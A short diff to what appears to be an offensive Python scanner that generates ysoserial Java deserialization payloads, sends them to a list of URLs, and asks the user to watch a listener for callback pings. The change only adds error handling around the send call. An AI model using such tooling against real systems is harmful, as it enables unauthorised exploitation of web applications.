@@ -139,7 +139,12 @@ try:
             new_url, data_to_post = change_get_to_post(url.rstrip())
             payload = generate_ysoserial(payload_id, ip_or_domain)
             print("ID: " + str(payload_id) + " - URLs: ")
-            send_payload(new_url, payload, data_to_post, headers, cookies)
+            try:
+                send_payload(new_url, payload, data_to_post, headers, cookies)
+            except KeyboardInterrupt:
+                sys.exit(0)
+            except:
+                pass
             payload_id += 1
     print("\033[0;31m[+][+]\033[0m CHECK FOR PINGs ON YOUR LISTENER")
 
